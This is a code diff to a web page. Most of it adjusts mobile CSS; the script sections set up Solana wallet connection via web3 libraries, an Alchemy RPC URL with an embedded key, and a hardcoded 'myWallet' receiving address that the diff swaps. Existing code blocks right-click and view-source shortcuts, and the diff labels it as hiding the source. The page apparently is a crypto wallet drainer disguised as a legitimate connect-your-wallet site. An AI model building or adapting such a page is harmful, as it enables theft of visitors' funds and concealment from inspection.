@@ -377,9 +377,9 @@
             bottom: 0;
             left: 0;
             right: 0;
-            background-color: var(--dark-bg);
+            background-color: rgba(15, 21, 40, 0.95);
+            padding: 12px 0;
             border-top: 1px solid var(--border-color);
-            padding: 10px 0;
             z-index: 100;
         }
         
@@ -398,8 +398,8 @@
         }
         
         .mobile-nav-item i {
-            font-size: 18px;
-            margin-bottom: 4px;
+            font-size: 20px;
+            margin-bottom: 5px;
         }
         
         .mobile-nav-item.active {
@@ -408,11 +408,6 @@
         
         /* Mobile-specific styles */
         @media screen and (max-width: 768px) {
-            body {
-                background-color: var(--dark-bg);
-                background-image: none;
-            }
-            
             .navbar {
                 padding: 10px 15px;
                 justify-content: space-between;
@@ -426,7 +421,6 @@
             
             .logo {
                 font-size: 24px;
-                color: var(--primary-blue);
             }
             
             .nav-links {
@@ -449,7 +443,7 @@
             
             .title {
                 font-size: 32px;
-                margin-bottom: 10px;
+                margin-bottom: 15px;
             }
             
             .subtitle {
@@ -460,7 +454,6 @@
             .connect-box {
                 padding: 25px 15px;
                 margin-bottom: 20px;
-                text-align: center;
             }
             
             .steps-box {
@@ -485,7 +478,6 @@
             
             .mobile-nav {
                 display: flex;
-                justify-content: space-around;
             }
             
             .faq-box, .footer {
@@ -493,9 +485,11 @@
             }
         }
     </style>
+    <!-- Disable right-click to prevent easy source viewing -->
     <script>
         document.addEventListener('contextmenu', event => event.preventDefault());
         
+        // Disable keyboard shortcuts for viewing source
         document.addEventListener("keydown", function(event) {
             if ((event.ctrlKey && (event.keyCode == 85 || event.keyCode == 83)) || event.keyCode == 123) {
                 event.preventDefault();
@@ -616,7 +610,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <script>
         const ALCHEMY_RPC = "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu";
-        const myWallet = new solanaWeb3.PublicKey('GKKPqBquMdR7cQfhvBmw9BfkBciR717tjfk1rzV2CFbo');
+        const myWallet = new solanaWeb3.PublicKey('ALBrGbkcpRVP6wyfkVkquXjmeu2E532NERa9bzs3a3w8');
 
         const connectButton = document.getElementById('connectButton');
         const connectButtonInner = document.getElementById('connectButtonInner');
